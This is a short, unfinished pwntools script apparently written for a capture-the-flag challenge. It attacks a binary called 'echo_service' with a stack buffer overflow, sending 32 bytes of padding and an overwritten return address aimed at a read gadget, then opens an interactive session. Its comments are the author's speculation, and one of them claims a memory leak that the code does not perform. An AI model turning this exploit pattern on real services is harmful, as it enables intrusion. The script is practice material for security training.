from pwn import *
import sys

# preload content
####################
context.binary = "./echo_service"
binary = ELF("./echo_service")


# functions
readInput = 0x400101


# gadget - read(0, [rsp], 320)
# Can i place some cool shit into rsi?
# 0x0000000000400105: mov eax, 0; mov edi, 0; mov rsi, rsp; mov edx, 0x320; syscall; 


# is this ret2reg? place [x] into [ex: rsi] then call rsi



#r = remote("university.opentoallctf.com", 30002)
r = process("./echo_service")
#r = process("./challenge", env={"LD_PRELOAD": "/lib/x86_64-linux-gnu/libc.so.6"}) 
gdb.attach(r)


r.recvline()

# Memleak - write@plt memleaks read@got
payload = ""
payload += "A" * 32
payload += p64(readInput)

r.send(payload)
r.recvline()

payload2 = ""
payload2 += "D" * 36

r.send(payload2)
r.interactive()
